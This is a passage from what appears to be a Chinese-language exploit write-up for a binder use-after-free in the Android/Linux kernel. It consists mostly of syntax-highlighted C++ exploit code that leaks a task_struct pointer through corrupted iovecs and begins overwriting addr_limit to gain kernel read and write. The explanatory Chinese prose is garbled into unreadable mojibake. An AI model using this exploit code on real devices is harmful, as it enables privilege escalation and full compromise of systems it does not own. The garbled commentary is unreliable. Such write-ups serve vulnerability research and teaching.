</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// To avoid this, we need to make sure that the overlapped data
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// should be set to 0.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// we can pass a valid memory address whose lower 32bit value is 0,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// then we can avoid spin lock issue.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mmap4gbAlignedPage</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>m_4gb_aligned_page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=n>PAGE_SIZE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=mh>0x41414141</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=n>PAGE_SIZE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Now link the poll wait queue to binder thread wait queue
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>linkEventPollWaitQueueToBinderThreadWaitQueue</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// We should trigger the unlink operation when we
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// have the binder_thread reallocated as iovec array
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Now fork
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>pid_t</span> <span class=n>childPid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>childPid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// child process
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// There is a race window between the unlink and blocking
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// in writev, so sleep for a while to ensure that we are
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// blocking in writev before the unlink happens
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Trigger the unlink operation on the reallocated chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>unlinkEventPollWaitQueueFromBinderThreadWaitQueue</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// First interesting iovec will read 0x1000 bytes of data.
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// This is just the junk data that we are not interested in
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>nBytesRead</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>dataBuffer</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>dataBuffer</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>nBytesRead</span> <span class=o>!=</span> <span class=n>PAGE_SIZE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x&#34;</span><span class=p>,</span> <span class=n>nBytesRead</span><span class=p>,</span> <span class=n>PAGE_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_SUCCESS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// parent process
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// I have seen some races which hinders the reallocation.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// So, now freeing the binder_thread after fork.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>freeBinderThread</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Reallocate binder_thread as iovec array
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// We need to make sure this writev call blocks
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// This will only happen when the pipe is already full
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// This print statement was ruining the reallocation,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// spent a night to figure this out. Commenting the
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// below line.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// INFO(&#34;[+] Reallocating binder_thread\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=n>writev</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>iovecStack</span><span class=p>,</span> <span class=n>IOVEC_COUNT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// If the corruption was successful, the total bytes written
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// should be equal to 0x2000. This is because there are two
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// valid iovec and the length of each is 0x1000
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>nBytesWritten</span> <span class=o>!=</span> <span class=n>PAGE_SIZE</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>nBytesWritten</span><span class=p>,</span> <span class=n>PAGE_SIZE</span> <span class=o>*</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] Wrote 0x%lx bytes</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>nBytesWritten</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Now read the actual data from the corrupted iovec
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// This is the leaked data from kernel address space
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// and will contain the task_struct pointer
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>nBytesRead</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>dataBuffer</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>dataBuffer</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>nBytesRead</span> <span class=o>!=</span> <span class=n>PAGE_SIZE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] read failed. nBytesRead: 0x%lx, expected: 0x%x&#34;</span><span class=p>,</span> <span class=n>nBytesRead</span><span class=p>,</span> <span class=n>PAGE_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Wait for the child process to exit
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>wait</span><span class=p>(</span><span class=n>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>m_task_struct</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>task_struct</span> <span class=o>*</span><span class=p>)</span> <span class=o>*</span><span class=p>((</span><span class=kt>int64_t</span> <span class=o>*</span><span class=p>)</span> <span class=p>(</span><span class=n>dataBuffer</span> <span class=o>+</span> <span class=n>TASK_STRUCT_OFFSET_IN_LEAKED_DATA</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>m_pidAddress</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>int8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_task_struct</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>task_struct</span><span class=p>,</span> <span class=n>pid</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>m_credAddress</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>int8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_task_struct</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>task_struct</span><span class=p>,</span> <span class=n>cred</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>m_nsproxyAddress</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>int8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_task_struct</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>task_struct</span><span class=p>,</span> <span class=n>nsproxy</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Leaked task_struct: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>m_task_struct</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] &amp;task_struct-&gt;pid: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>m_pidAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] &amp;task_struct-&gt;cred: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>m_credAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] &amp;task_struct-&gt;nsproxy: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>m_nsproxyAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾ˆå¥½ç†è§£ï¼Œexpè¿™éƒ¨åˆ†é¦–å…ˆåˆå§‹åŒ–ç¯å¢ƒä¹‹ååˆ›å»ºç”¨äºreadvå’Œwritevçš„pipeï¼Œreadvå’Œwritevå‡½æ•°ç”¨äºåœ¨ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¸­è¯»ã€å†™å¤šä¸ªéè¿ç»­ç¼“å†²åŒºã€‚ä¿®æ”¹pipeçš„sizeä¸º0x1000ã€‚</p><p>ä¹‹ååˆ›å»ºäº†25ä¸ªiovecï¼Œæ”¾åœ¨iovecStacké‡Œé¢ã€‚25ä¸ªæ˜¯æ ¹æ®binder_threadå’Œiovecçš„å¤§å°ç®—å‡ºæ¥</p><p><code>IOVEC_WQ_INDEX (int) = (offsetof(struct binder_thread, wait) / sizeof(struct iovec))</code></p><p>binder_threadç»“æ„ä½“å¤§å°ä¸º408ï¼Œ25ä¸ªiovecå¤§å°ä¸º25*16=400ï¼Œæ­£å¥½ã€‚è®¡ç®—å¯¹æ¯”<strong>binder_thread</strong>ä¸­wait.headçš„åç§»0xA0å’Œ<strong>iovecStack</strong>çš„åç§»iovecStack[10].iov_lenåŒ¹é…ã€‚</p><p><img src=https://my-md-1253484710.file.myqcloud.com/20200629155854.png loading=lazy></p><p>å‰é¢åŠ¨æ€è°ƒè¯•æ—¶ä¹Ÿèƒ½çœ‹åˆ°ä¼šæœ‰ä¸¤ä¸ªåœ°å€çš„å€¼ä¼šè¢«å†™å…¥åœ°å€ï¼Œè¿™é‡Œç›¸å¯¹åº”çš„ä½ç½®ä¸ºiovecStack[10].iov_len å’ŒiovecStack[11].io_baseã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œè¦ä¿®æ”¹iovecStack[10]çš„iov_lenå’Œpipeä¸€æ ·çš„å¤§å°ï¼Œé˜»å¡æ‰çˆ¶è¿›ç¨‹çš„writevç³»ç»Ÿè°ƒç”¨ï¼Œå†å»è§¦å‘unlinkæ“ä½œã€‚</p><p>è¿™é‡Œçš„iovecStack[10].io_baseæ­£å¥½å¯¹ä¸Šbinder_thread->wait.lockï¼Œå¦‚æœè¿™ä¸ªå€¼ä¸ä¸º0çš„è¯ï¼Œåé¢åœ¨å°è¯•å–è‡ªæ—‹é”é”ä¼šå‡ºé—®é¢˜ï¼Œä¸è¿›è¡Œunlinkæ“ä½œï¼Œè¿™ä¸ªå€¼æ˜¯32bitçš„ï¼Œiov_baseæ˜¯64bitçš„ï¼Œæ‰€ä»¥è¦è®¾ç½®å¯¹é½ï¼Œä½¿ç”¨mmapä¿è¯ä½32bitä¸º0ã€‚</p><p>iovecStack[10].iov_lenå’ŒiovecStack[11].iov_lenè®¾ç½®ä¸ºpipe sizeçš„å¤§å°ï¼ŒiovecStack[11].io_base è®¾ç½®ä¸ºæ–°åˆ†é…çš„ä¸€ä¸ªåœ°å€ï¼Œ</p><p>åˆ›å»ºforkå­è¿›ç¨‹è¿›è¡ŒEPOLL_CTL_DELæ“ä½œè§¦å‘unlinkã€‚è¯»å‡º0x1000 bytesçš„åƒåœ¾æ•°æ®æ¢å¤è¿›ç¨‹ï¼Œ</p><p>çˆ¶è¿›ç¨‹freeæ‰binder_threadï¼Œè°ƒç”¨writevç³»ç»Ÿè¿›è¡Œé˜»å¡ï¼Œç­‰å¾…å­è¿›ç¨‹å®Œæˆã€‚</p><p>æœ€åçˆ¶è¿›ç¨‹åœ¨è°ƒç”¨readè¯»å‡ºå·²ç»è¢«å­è¿›ç¨‹è¦†ç›–äº†å†…æ ¸åœ°å€å¤„çš„æ•°æ®ï¼Œæ ¹æ®åç§»è¯»å‡ºæ³„éœ²çš„task_structæŒ‡é’ˆã€‚</p><p>ä¸‹é¢è¿™å¼ å›¾æ˜¯<strong>Project Zero</strong> blogè´´å‡ºæ¥çš„æµç¨‹å›¾ï¼Œæ–¹ä¾¿ç†è§£æ•´ä¸ªè¿‡ç¨‹ã€‚</p><p><img src=https://my-md-1253484710.file.myqcloud.com/20200629014014.png loading=lazy></p><p>æ—¢ç„¶å·²ç»æœ‰task_structæŒ‡é’ˆï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥patch æ‰AddrLimitã€‚ç›´æ¥çœ‹expå®ç°ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=n>BinderUaF</span><span class=o>::</span><span class=n>clobberAddrLimit</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>sock_fd</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>msghdr</span> <span class=n>message</span> <span class=o>=</span> <span class=p>{</span><span class=n>nullptr</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>iovec</span> <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_COUNT</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=n>nullptr</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Get binder fd
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>setupBinder</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Create event poll
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>setupEventPoll</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Setting up socket</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>socketpair</span><span class=p>(</span><span class=n>AF_UNIX</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>sock_fd</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] Unable to create socketpair</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] Socketpair created successfully</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// We will just write junk data to socket so that when recvmsg
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// is called it process the fist valid iovec with this junk data
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// and then blocks and waits for the rest of the data to be received
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>static</span> <span class=kt>char</span> <span class=n>junkSocketData</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=mh>0x41</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Writing junk data to socket</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=n>write</span><span class=p>(</span><span class=n>sock_fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>junkSocketData</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>junkSocketData</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>nBytesWritten</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>junkSocketData</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>nBytesWritten</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>junkSocketData</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Write junk data to the socket so that when recvmsg is
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// called, it process the first valid iovec with this junk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// data and then blocks for the rest of the incoming socket data
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Setting up iovecs</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// We want to block after processing the iovec at IOVEC_WQ_INDEX,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// because then, we can trigger the unlink operation and get the
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// next iovecs corrupted to gain scoped write.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mmap4gbAlignedPage</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>m_4gb_aligned_page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=mh>0x41414141</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>2</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=mh>0x42424242</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>2</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mh>0x8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Prepare the data buffer that will be written to socket
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// will result in crash because of a check in do_page_fault
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// However, x86_64 does not have this check. But it&#39;s better
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// to set it to 0xFFFFFFFFFFFFFFFE so that this same code can
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// be used in arm64 as well.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>static</span> <span class=kt>uint64_t</span> <span class=n>finalSocketData</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=mh>0x1</span><span class=p>,</span>                    <span class=c1>// iovecStack[IOVEC_WQ_INDEX].iov_len
